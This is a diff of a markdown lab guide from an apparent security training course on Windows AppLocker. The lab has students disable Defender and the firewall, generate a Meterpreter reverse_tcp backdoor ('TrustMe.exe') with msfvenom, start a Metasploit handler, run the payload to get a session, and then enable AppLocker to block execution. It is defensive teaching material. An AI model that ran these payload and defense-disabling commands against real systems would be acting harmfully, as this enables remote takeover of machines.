@@ -9,12 +9,15 @@ Let’s see what happens when we do not have **AppLocker** running.  We will set
 
 Before we begin, we need to disable **Defender**. Start by opening an instance of **Windows Powershell**. Do this by clicking on the **Powershell** icon in the taskbar.
 
-![](attachments/OpeningPowershell.png)
+<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-15" src="https://github.com/user-attachments/assets/b51c10be-34d9-446a-be52-8ceb319815ac" />
+
 
 
 Next, run the following command in the **Powershell** terminal:
 
-<pre>Set-MpPreference -DisableRealtimeMonitoring $true</pre>
+```ps
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
 
 ![](attachments/applocker_disabledefender.png)
 
@@ -24,113 +27,150 @@ If you get angry red errors, that is **Ok**, it means **Defender** is not runnin
 
 Next, lets ensure the firewall is disabled. In a Windows Command Prompt.
 
-<pre> netsh advfirewall set allprofiles state off</pre>
+<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/3d9509ba-9139-4304-8f52-6854fee2b43c" />
+
+
+```cmd
+netsh advfirewall set allprofiles state off
+```
 
 
 Next, set a password for the Administrator account that you can remember
 
-<pre>net user Administrator password1234</pre>
+```cmd
+net user Administrator password1234
+```
 
 Please note, that is a very bad password.  Come up with something better. But, please remember it.
 
-Before we move on from our Powershell window, lets get our IP by running the following command:
 
-<pre>ipconfig</pre>
 
-![](attachments/powershellipconfig.png)
 
-**REMEMBER - YOUR IP WILL BE DIFFERENT**
+- To open a **Linux Shell**, either **double-click** `Ubuntu Shell` on Desktop
 
-Write this IP down so we can use it again later.
+<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/196f7867-877b-4a37-bc02-1214e50e96a5" />
 
-Let’s continue by opening a **Kali** instance.
 
-![](attachments/OpeningKaliInstance.png)
+- Or open **Command Prompt**
 
-Alternatively, you can click on the **Kali** icon in the taskbar.
+<img width="85" height="103" alt="image" src="https://github.com/user-attachments/assets/b2c7dbad-d57b-40d0-9318-ca8d40176c22" />
 
-![](attachments/TaskbarKaliIcon.png)
+- **SSH** into the **Linux** machine
+```bash
+ssh ubuntu@linux.cloudlab.lan
+```
+
+<img width="247" height="25" alt="image" src="https://github.com/user-attachments/assets/69706053-abe6-4de7-aa48-d9fd739ec4a7" />
+
+
+
+
+
+
 
 Let's start by getting root access in our terminal.
 
-<pre>sudo su -</pre>
+```bash
+sudo su -
+```
 
-We need to run the following command in order to mount our remote system to the correct directory:
+Before we run the next commands, we need to get the **IP** of our **Linux System**. Lets do so by running the following:
 
-<pre>mount -t cifs //[Your IP Address]/c$ /mnt/windows-share -o username=Administrator,password=password1234</pre>
+```bash
+ifconfig
+```
 
-**REMEMBER - YOUR IP ADDRESS AND PASSWORD WILL BE DIFFERENT.**
+<img width="716" height="175" alt="2026-02-23_10-33" src="https://github.com/user-attachments/assets/eb5b0547-6da5-4f35-8ce4-43580c8a97d7" />
 
-If you see the following error, it means that the device is already mounted.
-
-![](attachments/mounterror.png)
-
-If this is the case, ignore it.
-Run the following command to navigate into the mounted directory:
-
-<pre>cd /mnt/windows-share</pre>
-
-Before we run the next commands, we need to get the IP of our Kali System (AKA our Linux IP Adress). Lets do so by running the following:
-
-<pre>ifconfig</pre>
-
-![](attachments/applocker_ifconfig.png)
 
 **REMEMBER: YOUR IP WILL BE DIFFERENT**
 
 Now, run the following commands to start a simple backdoor and backdoor listener: 
 
-<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
+```bash
+cd /tmp/
+```
 
-Let's start the **Metasploit Handler**.  First, open a new **Kali** instance. The easiest way to do this is by clicking on the **Kali** icon in the taskbar.
+```bash
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe > TrustMe.exe
+```
 
-![](attachments/TaskbarKaliIcon.png)
+Let's start the **Metasploit Handler**
 
-Before doing anything else, we need to run the following command in our new terminal window:
+```bash
+msfconsole -q
+```
 
-<pre>msfconsole -q</pre>
+<img width="577" height="91" alt="2026-02-23_10-44" src="https://github.com/user-attachments/assets/967b59aa-7a46-4286-9263-25c1bfe77192" />
 
-![](attachments/msfconsole.png)
+
 
 The **Metasploit Handler** successfully ran if the terminal now starts with **"msf6 >"**
 
 Next, let's run the following:
 
-<pre>use exploit/multi/handler</pre>
+```bash
+use exploit/multi/handler
+```
 
 Now run all of the following commands to set the correct parameters:
 
-<pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
+```bash
+set PAYLOAD windows/meterpreter/reverse_tcp
+```
 
-<pre>set LHOST [Your Linux IP Address]</pre>
+```bash
+set LHOST [Your Linux IP Address]
+```
 
 **REMEMBER - YOUR IP WILL LIKELY BE DIFFERENT!**
 
 Go ahead and run the exploit:
 
-<pre>exploit</pre>
+```bash
+exploit
+```
 
 It should look like this:
 
-![](attachments/msf6commands.png)
+<img width="671" height="192" alt="2026-02-23_10-54" src="https://github.com/user-attachments/assets/4c40211d-7f95-48df-bff5-4a62c261d620" />
+
 
 Let’s download the malware and run it!
 
-Open a **Windows** command prompt. Do this by clicking on the icon in the taskbar.
+Going back to our **Powershell** terminal, copy the file over from **Linux**
 
-![](attachments/OpeningWindowsCommandPrompt.png) 
+```ps
+cd .\Desktop\
+```
+
+```ps
+scp ubuntu@linux.cloudlab.lan:/tmp/TrustMe.exe .
+```
+
+Open a **Windows** command prompt. 
+
+<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/86cb26ca-748a-4d29-9d5b-cdc31d22ca3a" />
 
 Once the prompt is open, let's run the following commands to run the **"TrustMe.exe"** file.
 
-<pre>cd \</pre>
+```cmd
+cd \Users\Administrator\Desktop
+```
+ 
+Then run it with the following:
 
-<pre>TrustMe.exe</pre>
+```cmd
+TrustMe.exe
+```
 
-![](attachments/runtrustme.png)
+<img width="407" height="85" alt="Screenshot From 2026-02-23 11-05-02" src="https://github.com/user-attachments/assets/d49eec4b-9798-4069-8728-2b5373fbd569" />
 
-Back at your **Kali** terminal, you should now have a **metasploit** session!
 
-![](attachments/meterpretersession.png)
+Back at your **Linux** terminal, you should now have a **metasploit** session!
+
+<img width="985" height="391" alt="2026-02-23_11-06" src="https://github.com/user-attachments/assets/1cc56b49-784c-4160-b042-7aacda9a5f75" />
+
 
 Let’s stop this from happening!
 
@@ -164,51 +204,70 @@ To do this you will need to select **AppLocker** on the far left pane.  You will
 
 ![](attachments/ruleenforcement.png)
 
-We will need to start the **"Application Identity service"**.  This is done through pressing the Windows key and typing **"Services"**.  
+We will need to start the **"Application Identity service"**.  This is done through this **cmd** command, open **Command Prompt**:
 
-![](attachments/services.png)
+<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/50e871b5-a3ec-4c55-92dd-db5fd4a1e1d4" />
 
-This will bring up the **Services App**.  Double-click **“Application Identity”**.
 
-![](attachments/applicationidentity.png)
+```cmd
+powershell sc start AppIDSvc
+```
 
-Once the **"Application Identity Properties"** dialog is open, please press the **Start** button.  This will start the service.
 
-![](attachments/startservice.png)
+Run **"gpupdate"** to force the policy change.
 
-Open a command prompt and run **"gpupdate"** to force the policy change.
 
-![](attachments/OpeningWindowsCommandPrompt.png)
-
-<pre>gpupdate /force</pre>
+```bash
+gpupdate /force
+```
 
 We are now going to try to run **"TrustMe.exe"** as another user on the system. 
 
 Run the following commands:
 
-<pre>cd /IntroLabs</pre>
+```cmd
+cd /IntroLabs
+```
 
-<pre>runas /user:whitelist "nc"</pre>
+```cmd
+runas /user:whitelist "C:\Tools\ncat.exe"
+```
 
 The password is **adhd**
 
-![](attachments/runas.png)
+<img width="943" height="111" alt="2026-02-23_11-42" src="https://github.com/user-attachments/assets/c6e06507-fb1c-4e49-8f09-20f44f1ec5c0" />
 
 As you can see, an error was generated, meaning that we were successful!
 
-***
-***Continuing on to the next Lab?***
 
-[Click here to get back to the Navigation Menu](/IntroClassFiles/navigation.md)
+***                                                                 
+
+<b><i>Continuing the course? </br>[Next Lab](/IntroClassFiles/Tools/IntroClass/bluespawnIntroClass/Bluespawn.md)</i></b>
+
+
+<b><i>Looking for a different lab? </br>[Lab Directory](/IntroClassFiles/navigation.md)</i></b>
 
 ***Finished with the Labs?***
-
 
 Please be sure to destroy the lab environment!
 
 [Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)
 
-[Return To Lab List](https://github.com/strandjs/IntroLabs/blob/master/IntroClassFiles/navigation.md)
 
----
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
